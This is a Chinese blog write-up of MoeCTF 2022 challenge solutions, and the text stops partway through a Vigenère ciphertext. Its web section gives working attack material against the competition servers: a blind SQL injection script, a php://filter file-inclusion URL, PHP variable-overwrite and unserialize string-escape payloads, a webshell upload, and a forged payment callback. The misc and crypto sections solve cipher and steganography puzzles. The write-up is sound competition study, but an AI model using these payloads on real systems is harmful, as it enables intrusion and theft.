---
title: "MoeCTF 2022 Writeup"
date: 2022-10-26T09:43:54+08:00
lastmod: 2022-10-26T09:43:54+08:00
draft: false
author: "X1r0z"

tags: ['ctf']
categories: ['web']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

web 的支付系统挺有意思的

其它方向的题之前也做了点, 后面就懒得写了...

<!--more-->

## Web

### ezhtml

右键源代码找到 evil.js

```js
var sx = document.querySelector('#sx');
var yw = document.querySelector('#yw');
var wy = document.querySelector('#wy');
var zh = document.querySelector('#zh');
var zf = document.querySelector('#zf');
var arr = [sx, yw, wy, zh];
var flag = false;
function check() {
    if (flag == true) {
        clearInterval(timer);
    }
    var sum = 0;
    for (var i = 0; i < arr.length; i++) {
        sum += eval(arr[i].innerHTML);
    }
    if (sum == eval(zf.innerHTML) && sum > 600) {
        alert('moectf{W3lc0me_to_theWorldOf_Web!}');
        flag = true;
    }
}
var timer = setInterval(check, 1000);
```

### cookiehead

改 cookie + xff + referer

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209111150690.png)

### God_of_Aim

右键源代码

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209111150276.png)

aimtrainer.js

```js
var _0x78bd=["\x61\x69\x6D\x54\x72\x61\x69\x6E\x65\x72\x45\x6C","\x61\x69\x6D\x2D\x74\x72\x61\x69\x6E\x65\x72","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x73\x63\x6F\x72\x65\x45\x6C","\x73\x63\x6F\x72\x65","\x61\x69\x6D\x73\x63\x6F\x72\x65","\x64\x65\x6C\x61\x79","\x74\x61\x72\x67\x65\x74\x53\x69\x7A\x65","\x61\x69\x6D\x73\x63\x6F\x72\x65\x45\x4C","\x73\x65\x74\x53\x63\x6F\x72\x65","\x73\x74\x61\x72\x74","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x73\x65\x74\x41\x69\x6D\x53\x63\x6F\x72\x65","\x70\x6F\x73\x69\x74\x69\x6F\x6E","\x73\x74\x79\x6C\x65","\x72\x65\x6C\x61\x74\x69\x76\x65","\x74\x69\x6D\x65\x72","\x63\x72\x65\x61\x74\x65\x54\x61\x72\x67\x65\x74","\x63\x68\x65\x63\x6B\x66\x6C\x61\x67\x31","\x63\x68\x65\x63\x6B\x66\x6C\x61\x67\x32","\x73\x74\x6F\x70","\x6D\x6F\x65\x63\x74\x66\x7B\x4F\x68\x5F\x79\x6F\x75\x5F\x63\x61\x6E\x5F\x61\x31\x6D\x5F","\u4F60\u5DF2\u7ECF\u5B66\u4F1A\u7784\u51C6\u4E86\uFF01\u8BD5\u8BD5\u770B\x3A","\x73\x74\x61\x72\x74\x32","\x61\x6E\x64\x5F\x48\x34\x63\x6B\x5F\x4A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x7D",""];class AimTrainer{constructor({_0xf777x2,_0xf777x3}){this[_0x78bd[0]]= document[_0x78bd[2]](_0x78bd[1]);this[_0x78bd[3]]= document[_0x78bd[2]](_0x78bd[4]);this[_0x78bd[4]]= 0;this[_0x78bd[5]]= 0;this[_0x78bd[6]]= _0xf777x2|| 1000;this[_0x78bd[7]]= _0xf777x3|| 30;this[_0x78bd[8]]= document[_0x78bd[2]](_0x78bd[5])}createTarget(){const _0xf777x5= new Target({delay:this[_0x78bd[6]],targetSize:this[_0x78bd[7]],aimTrainerEl:this[_0x78bd[0]],onTargetHit:()=>{this[_0x78bd[9]](this[_0x78bd[4]]+ 1)}});_0xf777x5[_0x78bd[10]]()}setScore(_0xf777x7){this[_0x78bd[4]]= _0xf777x7;this[_0x78bd[3]][_0x78bd[11]]= this[_0x78bd[4]]}setAimScore(_0xf777x7){this[_0x78bd[5]]= _0xf777x7;this[_0x78bd[8]][_0x78bd[11]]= _0xf777x7}start1(){this[_0x78bd[9]](0);this[_0x78bd[12]](10);this[_0x78bd[0]][_0x78bd[14]][_0x78bd[13]]= _0x78bd[15];if(!this[_0x78bd[16]]){this[_0x78bd[16]]= setInterval(()=>{this[_0x78bd[17]]();this[_0x78bd[3]][_0x78bd[11]]= this[_0x78bd[4]];this[_0x78bd[18]]()},this[_0x78bd[6]])}else {return}}start2(){this[_0x78bd[7]]= 10;this[_0x78bd[6]]= 400;this[_0x78bd[9]](0);this[_0x78bd[12]](100000);this[_0x78bd[0]][_0x78bd[14]][_0x78bd[13]]= _0x78bd[15];if(!this[_0x78bd[16]]){this[_0x78bd[16]]= setInterval(()=>{this[_0x78bd[17]]();this[_0x78bd[3]][_0x78bd[11]]= this[_0x78bd[4]];this[_0x78bd[19]]()},this[_0x78bd[6]])}else {return}}checkflag1(){if(this[_0x78bd[4]]== this[_0x78bd[5]]){this[_0x78bd[20]]();alert(_0x78bd[21]);alert(_0x78bd[22]);this[_0x78bd[23]]()}}checkflag2(){if(this[_0x78bd[4]]== this[_0x78bd[5]]){this[_0x78bd[20]]();alert(_0x78bd[24])}}stop(){this[_0x78bd[0]][_0x78bd[11]]= _0x78bd[25];if(this[_0x78bd[16]]){clearInterval(this[_0x78bd[16]]);this[_0x78bd[16]]= 0}else {return}}}
```

代码混淆过了, 其实找到三个 alert 在主页调用即可

```js
alert(_0x78bd[21]);alert(_0x78bd[22]);alert(_0x78bd[24])
````

或者找在线网站解密 [https://www.sojson.com/jsjiemi.html](https://www.sojson.com/jsjiemi.html)

```js
var _0x78bd = ["aimTrainerEl", "aim-trainer", "getElementById", "scoreEl", "score", "aimscore", "delay", "targetSize", "aimscoreEL", "setScore", "start", "innerHTML", "setAimScore", "position", "style", "relative", "timer", "createTarget", "checkflag1", "checkflag2", "stop", "moectf{Oh_you_can_a1m_", "你已经学会瞄准了！试试看:", "start2", "and_H4ck_Javascript}", ""];
class AimTrainer {
    constructor({
        _0xf777x2, _0xf777x3
    }) {
        this[_0x78bd[0]] = document[_0x78bd[2]](_0x78bd[1]);
        this[_0x78bd[3]] = document[_0x78bd[2]](_0x78bd[4]);
        this[_0x78bd[4]] = 0;
        this[_0x78bd[5]] = 0;
        this[_0x78bd[6]] = _0xf777x2 || 1000;
        this[_0x78bd[7]] = _0xf777x3 || 30;
        this[_0x78bd[8]] = document[_0x78bd[2]](_0x78bd[5])
    }
    createTarget() {
        const _0xf777x5 = new Target({
            delay: this[_0x78bd[6]],
            targetSize: this[_0x78bd[7]],
            aimTrainerEl: this[_0x78bd[0]],
            onTargetHit: () => {
                this[_0x78bd[9]](this[_0x78bd[4]] + 1)
            }
        });
        _0xf777x5[_0x78bd[10]]()
    }
    setScore(_0xf777x7) {
        this[_0x78bd[4]] = _0xf777x7;
        this[_0x78bd[3]][_0x78bd[11]] = this[_0x78bd[4]]
    }
    setAimScore(_0xf777x7) {
        this[_0x78bd[5]] = _0xf777x7;
        this[_0x78bd[8]][_0x78bd[11]] = _0xf777x7
    }
    start1() {
        this[_0x78bd[9]](0);
        this[_0x78bd[12]](10);
        this[_0x78bd[0]][_0x78bd[14]][_0x78bd[13]] = _0x78bd[15];
        if (!this[_0x78bd[16]]) {
            this[_0x78bd[16]] = setInterval(() => {
                this[_0x78bd[17]]();
                this[_0x78bd[3]][_0x78bd[11]] = this[_0x78bd[4]];
                this[_0x78bd[18]]()
            }, this[_0x78bd[6]])
        } else {
            return
        }
    }
    start2() {
        this[_0x78bd[7]] = 10;
        this[_0x78bd[6]] = 400;
        this[_0x78bd[9]](0);
        this[_0x78bd[12]](100000);
        this[_0x78bd[0]][_0x78bd[14]][_0x78bd[13]] = _0x78bd[15];
        if (!this[_0x78bd[16]]) {
            this[_0x78bd[16]] = setInterval(() => {
                this[_0x78bd[17]]();
                this[_0x78bd[3]][_0x78bd[11]] = this[_0x78bd[4]];
                this[_0x78bd[19]]()
            }, this[_0x78bd[6]])
        } else {
            return
        }
    }
    checkflag1() {
        if (this[_0x78bd[4]] == this[_0x78bd[5]]) {
            this[_0x78bd[20]]();
            alert(_0x78bd[21]);
            alert(_0x78bd[22]);
            this[_0x78bd[23]]()
        }
    }
    checkflag2() {
        if (this[_0x78bd[4]] == this[_0x78bd[5]]) {
            this[_0x78bd[20]]();
            alert(_0x78bd[24])
        }
    }
    stop() {
        this[_0x78bd[0]][_0x78bd[11]] = _0x78bd[25];
        if (this[_0x78bd[16]]) {
            clearInterval(this[_0x78bd[16]]);
            this[_0x78bd[16]] = 0
        } else {
            return
        }
    }
}
```

### What are you uploading

前端有 js 检查

```js
function checkFile()
{
     var flag = false;
     var str = document.getElementById("file").value;
     str = str.substring(str.lastIndexOf('.') + 1);
     var arr = new Array('png','jpg','gif');
     for(var i=0;i<arr.length;i++)
     {
         if(str==arr[i])
         {
            flag = true;
         }
     }
     if(!flag)
     {
        alert('可恶的hacker！只能上传.png或.jpg或gif!');
        return false;
     }
     return flag;
}
```

上传图片马

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209111156437.png)

把 filename 改成 f1ag.php

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209111157214.png)

### baby_file

```php
<?php

if(isset($_GET['file'])){
    $file = $_GET['file'];
    include($file);
}else{
    highlight_file(__FILE__);
}
?>
```

伪协议

```
http://82.156.5.200:1041/?file=php://filter/convert.base64-encode/resource=flag.php
```

base64 解码

```php
<?php
Hey hey, reach the highest city in the world! Actually I am ikun!!;

moectf{Y0u_are_t00_baby_la};

?>
```

### sqlmap_boy

右键源代码

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209171111586.png)

双引号闭合

```python
import time
import requests

url = 'http://82.156.5.200:1045/login.php'

flag = ''

for i in range(1,100):
    for s in range(32,128):
        data = {
        'username': 'admin " and ascii(substr((select group_concat(flag) from moectf.flag),{},1))={} #'.format(i,s)
        }
        res = requests.post(url,data=data)
        if '"code":"1"' in res.text:
            flag += chr(s)
            print(flag)
            break
```

### ezphp

变量覆盖

```php
<?php

highlight_file('source.txt');
echo "<br><br>";

$flag = 'xxxxxxxx';
$giveme = 'can can need flag!';
$getout = 'No! flag.Try again. Come on!';
if(!isset($_GET['flag']) && !isset($_POST['flag'])){
    exit($giveme);
}

if($_POST['flag'] === 'flag' || $_GET['flag'] === 'flag'){
    exit($getout);
}

foreach ($_POST as $key => $value) {
    $$key = $value;
}

foreach ($_GET as $key => $value) {
    $$key = $$value;
}

echo 'the flag is : ' . $flag;

?>
```

首先必须要传 `flag=xxx`, 然后 xxx 的内容不能是 flag

后面的 foreach 中, 第一个 `$$key = $value` 是变量覆盖, 第二个 `$$key = $$value` 相当于给之前的变量做了一次引用

我们先把 `$flag` 的内容存到 `$aaa` 中, 然后把原来的 `$flag` 覆盖为 `$aaa`

```
http://82.156.5.200:1042/?aaa=flag&flag=aaa
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209111205572.png)

貌似没怎么用到 `$_POST`

### baby_unserialize

index.php

```php
<?php
session_start();
highlight_file(__FILE__);

class moectf{
    public $a;
    public $b;
    public $token='heizi';
    public function __construct($r,$s){
        $this->a = $r;
        $this->b = $s;
    }
}

$r = $_GET['r'];
$s = $_GET['s'];

if(isset($r) && isset($s) ){
    $moe = new moectf($r,$s);
    $emo = str_replace('aiyo', 'ganma', serialize($moe));
    $_SESSION['moe']=base64_encode($emo);

}

'a.php';
```

a.php

```php
<?php
session_start();
highlight_file(__FILE__);

include('flag.php');

class moectf{
    public $a;
    public $b;
    public $token='heizi';
    public function __construct($r,$s){
        $this->a = $r;
        $this->b = $s;
    }
}

if($_COOKIE['moe'] == 1){
    $moe = unserialize(base64_decode($_SESSION['moe']));
    if($moe->token=='baizi'){
        echo $flag;
    }
}
```

字符串逃逸, 而且是增长逃逸

`";s:5:"token";s:5:"baizi";}` 长度为 27, 因此输入 27 个 aiyo

```
http://43.138.48.124:12345/?r=123&s=aiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyo";s:5:"token";s:5:"baizi";}
```

最后改一下 cookie 就能得到 flag 了

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210021411627.png)

### 支付系统

```python
import os
import uuid
from quart import Quart, render_template, redirect, jsonify, request, session
from hashlib import pbkdf2_hmac
from enum import IntEnum
from tortoise import fields
from tortoise.models import Model
from tortoise.contrib.quart import register_tortoise
from httpx import AsyncClient

app = Quart(__name__)
app.secret_key = os.urandom(16)


class TransactionStatus(IntEnum):
    SUCCESS = 0
    PENDING = 1
    FAILED = 2
    TIMEOUT = 3


class Transaction(Model):
    id = fields.IntField(pk=True)
    user = fields.UUIDField()
    amount = fields.IntField()
    status = fields.IntEnumField(TransactionStatus)
    desc = fields.TextField()
    hash = fields.CharField(64, null=True)

    def __init__(self, **kwargs):
        super().__init__()
        for k, v in kwargs.items():
            self.__setattr__(k, v)


async def do_callback(transaction: Transaction):
    async with AsyncClient() as ses:
        transaction.status = int(TransactionStatus.FAILED)
        data = (
            f'{transaction.id}'
            f'{transaction.user}'
            f'{transaction.amount}'
            f'{transaction.status}'
            f'{transaction.desc}'
        ).encode()
        await ses.post(f'http://localhost:8000/callback', data={
            'id': transaction.id,
            'user': transaction.user,
            'amount': transaction.amount,
            'desc': transaction.desc,
            'status': transaction.status,
            'hash': pbkdf2_hmac('sha256', data, app.secret_key, 2**20).hex()
        })


@app.before_request
async def create_session():
    if 'uid' not in session:
        session['uid'] = str(uuid.uuid4())
    session['balance'] = 0
    for tr in await Transaction.filter(user=session['uid']).all():
        if tr.status == TransactionStatus.SUCCESS:
            session['balance'] += tr.amount


@app.route('/pay')
async def pay():
    transaction = await Transaction.create(
        amount=request.args.get('amount'),
        desc=request.args.get('desc'),
        status=TransactionStatus.PENDING,
        user=uuid.UUID(session.get('uid'))
    )
    app.add_background_task(do_callback, transaction)
    return redirect(f'/transaction?id={transaction.id}')


@app.route('/callback', methods=['POST'])
async def callback():
    form = dict(await request.form)
    data = (
        f'{form.get("id")}'
        f'{form.get("user")}'
        f'{form.get("amount")}'
        f'{form.get("status")}'
        f'{form.get("desc")}'
    ).encode()
    k = pbkdf2_hmac('sha256', data, app.secret_key, 2**20).hex()
    tr = await Transaction.get(id=int(form.pop('id')))
    if k != form.get("hash"):
        return '403'
    form['status'] = TransactionStatus(int(form.pop('status')))
    tr.update_from_dict(form)
    await tr.save()
    return 'ok'


@app.route('/transaction')
async def transaction():
    if 'id' not in request.args:
        return '404'
    transaction = await Transaction.get(id=request.args.get('id'))
    return await render_template('receipt.html', transaction=transaction)


@app.route('/flag')
async def flag():
    return await render_template(
        'flag.html',
        balance=session['balance'],
        flag=os.getenv('FLAG'),
    )


@app.route('/')
@app.route('/index.html')
async def index():
    with open(__file__) as f:
        return await render_template('source-highlight.html', code=f.read())


register_tortoise(
    app,
    db_url="sqlite://./data.db",
    modules={"models": [__name__]},
    generate_schemas=True,
)

if __name__ == '__main__':
    app.run()
```

其实是个脑筋急转弯的题...

有四个路由 /pay /callback /transaction /flag

访问 /flag 试试

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209111208714.png)

根据题目的意思来说我们需要构造 100 元的数据

众所周知 flask 程序采用客户端 session, 知道了 secret_key 就可以进行伪造, 但是这里的 secret_key 内容是 `os.urandom(16)`

以为是哈希长度扩展攻击, 结果试了好几次都不成功...

/transaction 是查看用户信息的, 暂时不用管

剩下来 /pay 和 /callback

先看 /pay

```python
@app.route('/pay')
async def pay():
    transaction = await Transaction.create(
        amount=request.args.get('amount'),
        desc=request.args.get('desc'),
        status=TransactionStatus.PENDING,
        user=uuid.UUID(session.get('uid'))
    )
    app.add_background_task(do_callback, transaction)
    return redirect(f'/transaction?id={transaction.id}')
```

get 传参构造订单, 其中 amount 就是我们需要构造的地方, 并且每个用户对应一个唯一的 uid

这里还有一个 desc, 用处到后面再说

然后回调到 do_callback

```python
async def do_callback(transaction: Transaction):
    async with AsyncClient() as ses:
        transaction.status = int(TransactionStatus.FAILED)
        data = (
            f'{transaction.id}'
            f'{transaction.user}'
            f'{transaction.amount}'
            f'{transaction.status}'
            f'{transaction.desc}'
        ).encode()
        await ses.post(f'http://localhost:8000/callback', data={
            'id': transaction.id,
            'user': transaction.user,
            'amount': transaction.amount,
            'desc': transaction.desc,
            'status': transaction.status,
            'hash': pbkdf2_hmac('sha256', data, app.secret_key, 2**20).hex()
        })
```

这里由订单数据生成了对应的 hash, 之后 post 数据给 /callback

先关注一下 data 的结构

```python
data = (
    f'{transaction.id}'
    f'{transaction.user}'
    f'{transaction.amount}'
    f'{transaction.status}'
    f'{transaction.desc}'
    ).encode()
```

看着不是很明显, 我们把空格和换行去掉

```python
data = (f'{transaction.id}'f'{transaction.user}'f'{transaction.amount}'f'{transaction.status}'f'{transaction.desc}').encode()
```

这里的 data 其实是由多个字符串**拼接**而成, 而且 desc 恰好跟在了 status 的后面

再看 /callback

```python
@app.route('/callback', methods=['POST'])
async def callback():
    form = dict(await request.form)
    data = (
        f'{form.get("id")}'
        f'{form.get("user")}'
        f'{form.get("amount")}'
        f'{form.get("status")}'
        f'{form.get("desc")}'
    ).encode()
    k = pbkdf2_hmac('sha256', data, app.secret_key, 2**20).hex()
    tr = await Transaction.get(id=int(form.pop('id')))
    if k != form.get("hash"):
        return '403'
    form['status'] = TransactionStatus(int(form.pop('status')))
    tr.update_from_dict(form)
    await tr.save()
    return 'ok'
```

接收数据并且对 hash 进行校验, 然后将订单的 status 更改为我们传入的值

其中 data 的结构同上

再看一下开头的 create_session

```python
@app.before_request
async def create_session():
    if 'uid' not in session:
        session['uid'] = str(uuid.uuid4())
    session['balance'] = 0
    for tr in await Transaction.filter(user=session['uid']).all():
        if tr.status == TransactionStatus.SUCCESS:
            session['balance'] += tr.amount
```

将所有 status 为 SUCCESS 的订单对应的 amount 相加, 得到该账户下的总余额

综上, 我们的思路就是访问 /pay 和 /callback 构造订单, 把 status 修改为 SUCCESS (对应数字 0), 然后访问 /flag 得到 flag

因为 data 是由字符串拼接的, 我们可以利用 status 左右两边的数据对 status 的值进行伪造

简单写一下

```
id user amount status desc
aa bbb   1000    2    123
```

这是原来的数据, 我们需要把 status 改为 0, 并且保证整个字符串拼接后的内容不变 (hash 相同), 才能通过校验

整个 data 为 `aabbb10002123`

然后把这个值再分段

```
id user amount status desc
aa bbb   100     0    2123
```

分段后的 data 依然是 `aabbb10002123`

通过构造末尾含 0 的 amount, 然后把原本的 2 挤到 desc 的地方, 就可以成功伪造订单数据

回到题目中, 我们先访问 `/pay?amount=1000&desc=123` 创建订单并得到对应的 id

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209111232951.png)

然后访问 /transaction 得到用户 uid 和订单 hash

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209111233049.png)

最后访问 /callback 构造 data

```
id=1432&user=707aee25-e078-4821-9804-b29fe1e15179&amount=100&status=0&desc=2123&hash=e79b06260b9abc341298230281f17adaf777cc61484f678f740a7d302fac6b69
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209111238211.png)

访问 /flag

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209111242413.png)

写 wp 的时候发现 flag 涨价了? 变成 200 块了

## Misc

### Hide-and-seek

pdf 打开后直接复制

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209111423973.png)

```
moectf{Hey_U_ve_f0und_m3!}
```

### Rabbit

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209111617786.png)

去掉注释

```
U2FsdGVkX1+EPlLmNvaJK4Pe06nW0eLquWsUpdyv3fjXM2PcDBDKlXeKupnnWlFHewFEGmqpGyC1VdX8
```

找个在线解密的网站, 密钥填空

[https://www.sojson.com/encrypt_rabbit.html](https://www.sojson.com/encrypt_rabbit.html)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209111620017.png)

### 小纸条

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209111620475.png)

猪圈密码

[http://www.hiencode.com/pigpen.html](http://www.hiencode.com/pigpen.html)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209111623243.png)

### 寻找黑客的家

百度识图找到地址就行... flag 忘记了

### Locked bass

zip 伪加密

```cmd
C:\Users\46224\Desktop\Tools\CTF>java -jar ZipCenOp.jar r "Locked bass.zip"
java.lang.reflect.InaccessibleObjectException: Unable to make public jdk.internal.ref.Cleaner java.nio.DirectByteBuffer.cleaner() accessible: module java.base does not "opens java.nio" to unnamed module @5197848c
        at java.base/java.lang.reflect.AccessibleObject.checkCanSetAccessible(AccessibleObject.java:354)
        at java.base/java.lang.reflect.AccessibleObject.checkCanSetAccessible(AccessibleObject.java:297)
        at java.base/java.lang.reflect.Method.checkCanSetAccessible(Method.java:200)
        at java.base/java.lang.reflect.Method.setAccessible(Method.java:194)
        at zip.CenOp$1.run(CenOp.java:94)
        at java.base/java.security.AccessController.doPrivileged(AccessController.java:318)
        at zip.CenOp.clean(CenOp.java:89)
        at zip.CenOp.operate(CenOp.java:80)
        at zip.CenOp.main(CenOp.java:32)
        at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:104)
        at java.base/java.lang.reflect.Method.invoke(Method.java:577)
        at org.eclipse.jdt.internal.jarinjarloader.JarRsrcLoader.main(JarRsrcLoader.java:58)
success 1 flag(s) found
C:\Users\46224\Desktop\Tools\CTF>
```

打开里面的 txt

```
这就是你要的贝斯：bW9lY3Rme04wd190aDFzX2k0X2FfYkBzc19VX2Nhbl91M2VfdG9fcGxhOX0=
```

base64 解码

```
moectf{N0w_th1s_i4_a_b@ss_U_can_u3e_to_pla9}
```

### Nyanyanya!

stegsolve 打开

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209111632264.png)

提示是 lsb 隐写

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209111632026.png)

### What do you recognize me by?

解压后十六进制打开

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209111634916.png)

有 IHDR IDAT 这些关键词, 很明显是 png 文件

把 PNI 改成 PNG

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209111635654.png)

扫码后得到 flag

```
moectf{You_r4c0gnize_%e!}
```

### 想听点啥?

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209111636021.png)

压缩包是加密的

 mscz 文件要安装 MuseScore 才能打开

安装后双击打开

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209111637292.png)

密码试了好几遍.... 为 `MOECTFI1iKE`

解压后有 flag.txt 和 qaq.py

```python
# this is not flag, but real flag will be encrypted in same algorithm.
flag = 'moectf{xxxxxxxxxxxxxxxxxxxxx}'

def encrypt(src: str) -> bytes:
    return bytes([ord(src[i]) ^ ord(src[i-1]) for i in range(1, len(src))])

with open('flag.txt', 'wb') as out:
    out.write(encrypt(flag))
```

将明文的某一位和它的前一位异或

因为是对自身进行异或, 而 flag 的格式已知, 以 `moectf{` 为开头

思路就是先用第一个 `m` 来异或密文第一位得到明文的第二个字母, 然后用第二个字母异或密文第二位得到第三个字母, 以此类推

解密代码如下

```python
# this is not flag, but real flag will be encrypted in same algorithm.

def encrypt(src):
    return bytes([ord(src[i]) ^ ord(src[i-1]) for i in range(1, len(src))])

with open('flag.txt', 'rb') as f:
    content = f.read()

#  m o e c t f { message
#    m o e c t f { key
#  x x x x x x x x cipher

dec = 'm'
key = 'm'
for i in range(len(content)):
    m = chr(content[i] ^ ord(key[i]))
    dec += m
    key += m
print(dec)
```

flag 如下

```
moectf{Want_s0me_mor3_mus1c?}
```

### H■m■i■g

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209111645317.png)

alice.py

```python
from secret import mytext#It's in alice's device. We can't know!
from polar_router import send_over_weak_noisy_channel#how it works doesn't matter, u don't need this lib
from Crypto.Util.number import bytes_to_long
from functools import reduce

def hamming_encode(bitsblock):#do u know how it works?
    for t in range(4):
        bitsblock[1<<t]=reduce(
            lambda x,y:x^y ,
            [bit for i,bit in enumerate(bitsblock) if i&(1<<t)]
            )
    return bitsblock

bintxt=bin(bytes_to_long(mytext))[2:]
lenbintxt=len(bintxt)
assert lenbintxt%11==0
blocks=lenbintxt//11
bitlist=list(map(int,bintxt))
raw_msg=[[0]*3+[bitlist[i]]+[0]+bitlist[i+1:i+4]+[0]+bitlist[i+4:i+11] for i in range(0,lenbintxt,11)]

encoded_msg=[hamming_encode(raw_msg[i]) for i in range(blocks)]

send_over_weak_noisy_channel(encoded_msg)#send it
```

bob.py

```python
from polar_router import recv_over_weak_noisy_channel#how it works doesn't matter, u don't need this lib, just ignore it
from Crypto.Util.number import long_to_bytes#really useful! 

def hamming_correct(bitblock):
    #you should write this function, to help polar decode the msg
    #Good luck and take it easy!
    pass

def decode(msg):
    blocks=len(msg)
    bitlist=[]
    #Let's cancel the noise...
    for i in range(blocks):
        wrongbitpos=hamming_correct(msg[i])
        msg[i][wrongbitpos]=int(not msg[i][wrongbitpos])
        #add corrected bits to a big list
        bitlist.extend([msg[i][3]]+msg[i][5:8]+msg[i][9:16])
    #...then, decode it!
    totallen=len(bitlist)
    bigint=0
    for i in range(totallen):
        bigint<<=1
        bigint+=bitlist[i]
    return long_to_bytes(bigint)

noisemsg=recv_over_weak_noisy_channel()#it's a big matrix!
msg=decode(noisemsg)
print(msg)#Well done
```

hamming encode 提示是汉明码, 我们需要在 bob.py 中实现 `hamming_correct` 函数, 才能得到 flag

hamming correct 就是汉明码的纠错机制

贴一下 3b1b 的视频, 讲解的挺清晰的

[https://www.bilibili.com/video/BV1WK411N7kz](https://www.bilibili.com/video/BV1WK411N7kz)

纠错函数如下

```python
def hamming_correct(bitblock):
    #you should write this function, to help polar decode the msg
    #Good luck and take it easy!
    return reduce(
        lambda x,y: x^y,
        [i for (i,b) in enumerate(bitblock) if b]
        )
```

输出

```
b'Once upon a time, there were 1023 identical bottles, 1022 of which were plain water and one of which was poison. Any creature that drinks the poison will die within a week. Now, with 10 mice and a week, how do you tell which bottle has poison in it? moectf{Oh_Bin4ry_Mag1c_1s_s0o_c0O1!} Great!'
```

## Crypto

### ABCDEFG~

```
moectf{18 24 26 13 08 18 13 20 26 15 11 19 26 25 22 07 08 12 13 20}
```

对着字母表转换一下就行, 注意顺序是倒过来的

```python
text = '18 24 26 13 08 18 13 20 26 15 11 19 26 25 22 07 08 12 13 20'.split(' ')
alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'

flag = ''

for i in text:
    flag += alphabet[::-1][int(i) - 1]
print(flag)
```

### 小小凯撒

```
kqEftuEUEftqOADDqoFRxmsOAzsDmFGxmFuAzE
```

凯撒密码, 找个在线网站解密

[https://zh.planetcalc.com/1434/](https://zh.planetcalc.com/1434/)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209111345527.png)

然后每个单词首字母大写, 其余小写, 无分隔

```
moectf{YesThisIsTheCorrectFlagCongratulations}
```

### 凯撒变异了

hint 是 114514, 并且内容是小写 + 大写共 52 位

```
ZpyLfxGmelDeftewJwFbwDGssZszbliileadaa
```

常规的凯撒移位不行... 后来想了想会不会是找规律(?)

每个字母分别移位 1 1 4 5 1 4 位, 然后循环

```python
alphabets = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'

cipher = 'ZpyLfxGmelDeftewJwFbwDGssZszbliileadaa' # length: 38
message = ''
nums = [1,1,4,5,1,4] * 6 + [1,1]

for i in range(len(cipher)):
    message += alphabets[alphabets.index(cipher[i]) - nums[i]]
print(message)
```

输出如下

```
YouGetFlagCaesarIsEasyForYouahhhhZZZZZ
```

### Vigenère

```
bsijjvusbtq nwloqbyb, ngvysbrhn kqiqmjqzv ci hgkrnwl, cr mmh kjjwsbhh jx ylnmjfoawa hgkrmejnhhs et ernhzfwdfp cmytuhsccng wlncb. cs bx svjc ie bsijjvusbtq mabe ltsdbwvymm. nw oqycbtqot awpneahn hayuxswdfp iq kjgpurhf mmh kjxvzunodlh ie nsdplqiqbehy/awuoiwrkjrusx ffxwbm sh idos, xl saj xidjqenq xnw, mcrvqrnmay, cbxuphccng, ihgwccng, hrmjdjsbtq, hgmcebhdoaxh, hgxszuccng, whxgaxhgl, rm vnpzezdoaxh ny nqagagzmnri. ac uklt linxfuxx dxlriml nqowwxdw yr mwmobx ykz smpdkxh deyubmx ra kdwg bsfdvnhsl. uujlnwsxi lixxlltyljf vux mfnz sws ehwp, z.y. nfdvyujfrw nk uktkrwze, ydiyrvkx (j.j. ksyyqptuf) ga cmmfqbakfd (x.l. nigffdwlh). dfoiqffwdgw mdvzudlh'm oknpvjh znvzv dk cbd ufovflyc iwrowlnhhs ra lqy bhsidvnhsbfodlh, cmmjjmacs, zgi dqsrfzunodlh ie wfwv (sumn dsrrf jm saj fds clhti) zcauy ltnqosrhhgl d aglor hs haxrwhxsw kgucbr npkdngdgydoaxh, zeq zdlqitm mdhhnlhgl rmyjhhsfwdgw jqhixxlrphmd. wcab cr efubwus zvmlznnx sawrpyq u rmwxxldldw wlnc vumtlhhwwn oktfzkb ngty linxfuxx:
1. lywwnhydliy rhehwpvlrim tsg mwuusxi dnknnr, iqxn hxndgylvd cbqxfwn, ndfmxwdwaucsbjv, vfm cliffok;
2. npzezdoawa saj udktm
3. cxhlyawa ghb wj smxqxxv jj cldty wcw acrdx l.z. lx uuhng, haccftyh, nzjld hw dxunjs mmhh
